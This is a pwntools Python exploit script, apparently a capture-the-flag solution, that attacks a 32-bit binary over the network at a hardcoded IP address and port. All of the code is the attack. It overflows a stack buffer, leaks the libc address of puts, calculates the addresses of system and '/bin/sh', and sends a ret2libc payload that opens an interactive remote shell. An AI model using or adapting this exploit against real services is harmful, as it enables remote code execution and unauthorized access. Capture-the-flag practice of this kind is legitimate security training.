from pwn import *

context.binary = './chall'
elf = context.binary
libc = ELF('./libc-2.27.so')

p = remote('152.118.201.241', 3018)

offset = 20

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.symbols['main']

# leak puts
def leak_puts():
    while True:
        payload = b"A"*offset
        payload += p32(puts_plt)
        payload += p32(main)
        payload += p32(puts_got)

        p.recvuntil(b'good luck!\n')
        p.sendline(payload)

        data = p.recvline().strip()

        if len(data) == 0:
            continue

        return u32(data[:4].ljust(4, b'\x00'))

puts_leak = leak_puts()
log.info(f"puts leak: {hex(puts_leak)}")

# calc libc
libc_base = puts_leak - libc.symbols['puts']
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b"/bin/sh"))

# get shell
payload = b"A"*offset
payload += p32(system)
payload += b"BBBB"
payload += p32(binsh)

p.sendline(payload)
p.interactive()